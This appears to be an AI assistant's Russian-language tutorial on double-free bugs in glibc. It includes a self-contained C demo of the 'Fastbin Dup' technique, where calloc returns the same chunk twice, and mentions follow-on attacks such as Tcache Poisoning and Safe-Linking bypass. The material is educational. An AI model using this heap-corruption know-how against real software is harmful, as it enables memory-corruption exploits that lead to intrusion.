Вот пример классического эксплойта через **double free** — по шагам, чтобы было понятно, что именно происходит в памяти.

### 🎯 Суть уязвимости

Программа вызывает `free()` дважды для одного и того же указателя. Это ломает внутренние структуры аллокатора памяти (в Linux это `glibc`), позволяя злоумышленнику заставить `malloc()` выдать две разные переменные, указывающие на **один и тот же участок памяти** . Если злоумышленник контролирует одну из них, он может изменить данные другой .

### 💻 Конкретный пример (Fastbin Dup)

Этот код демонстрирует базовую технику под названием **Fastbin Dup** .

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    setbuf(stdout, NULL); // Отключаем буферизацию для чистого вывода

    // 1. Заполняем tcache (на современных glibc, чтобы free попал в fastbin)
    void *ptrs[8];
    for (int i = 0; i < 8; i++) {
        ptrs[i] = malloc(8);
    }
    for (int i = 0; i < 7; i++) {
        free(ptrs[i]); // Забиваем tcache
    }

    printf("Выделяем 3 буфера.\n");
    int *a = calloc(1, 8);
    int *b = calloc(1, 8);
    int *c = calloc(1, 8);

    printf("a: %p\n", a);
    printf("b: %p\n", b);
    printf("c: %p\n", c);

    printf("Освобождаем 'a'...\n");
    free(a); // Fastbin: [a]

    printf("Освобождаем 'b'...\n");
    free(b); // Fastbin: [b] -> [a]

    printf("Снова освобождаем 'a' (Double Free!)...\n");
    free(a); // Fastbin: [a] -> [b] -> [a] -> [b] -> ...

    printf("Теперь список свободных [ %p, %p, %p ]\n", a, b, a);

    printf("Выделяем 3 раза...\n");
    int *d = calloc(1, 8); // Возвращает 'a'
    int *e = calloc(1, 8); // Возвращает 'b'
    int *f = calloc(1, 8); // Возвращает 'a' СНОВА!

    printf("d: %p\n", d);
    printf("e: %p\n", e);
    printf("f: %p\n", f);

    // Проверка: d и f указывают на один и тот же адрес
    assert(d == f); 
    printf("УСПЕХ: 'd' и 'f' указывают на один и тот же адрес!\n");

    return 0;
}
```

### 🧠 Пошаговое объяснение

**1. Подготовка (fill tcache)**
На современных системах `glibc` (>= 2.26) сначала появился кэш `tcache`. Чтобы эксплойт сработал, нужно сначала "забить" его 7 освобождениями, чтобы следующее `free()` пошло в более старый список — `fastbin` .

**2. Аллокация и первое `free(a)`**
Выделяем `a`, `b`, `c`. После `free(a)` в `fastbin` находится только `a`. Если сейчас сделать `free(a)` ещё раз, `glibc` выдаст ошибку `double free or corruption (fasttop)`, потому что `a` — первый элемент в списке .

**3. Обход защиты (free(b), затем free(a))**
Мы делаем `free(b)`. Теперь в `fastbin` список выглядит как `[b] -> [a]`. Теперь делаем `free(a)` **снова**. Проверка `fasttop` смотрит только на первый элемент (который сейчас `b`), поэтому она пропускает повторное освобождение `a`. В итоге в `fastbin` образуется **цикл**: `[a] -> [b] -> [a] -> [b] -> ...` .

**4. Результат (два указателя на один адрес)**
Теперь, если мы трижды вызовем `calloc`, аллокатор последовательно выдаст нам `a`, потом `b`, а потом **снова `a`**. Переменные `d` и `f` будут указывать на одну и ту же память. `assert(d == f)` это подтверждает.

### ⚠️ Что даёт злоумышленнику

Имея два указателя на один адрес, злоумышленник может использовать один из них для изменения данных, которые другой указатель всё ещё считает "своими". Это основа для более сложных атак, таких как **Fastbin Dup Into Stack** (когда удаётся заставить `malloc` вернуть указатель на стек) или **Tcache Poisoning** (запись произвольных адресов в список свободных блоков) .

### 📌 Важное замечание

Этот пример **работает только в демонстрационных/учебных целях** или в системах без современных защит. На реальных системах с `glibc` версии **2.32+** включается механизм **Safe-Linking**, который шифрует указатели в списках свободных блоков, и для успешного эксплойта злоумышленнику потребуется сначала получить утечку адреса кучи (heap leak) .
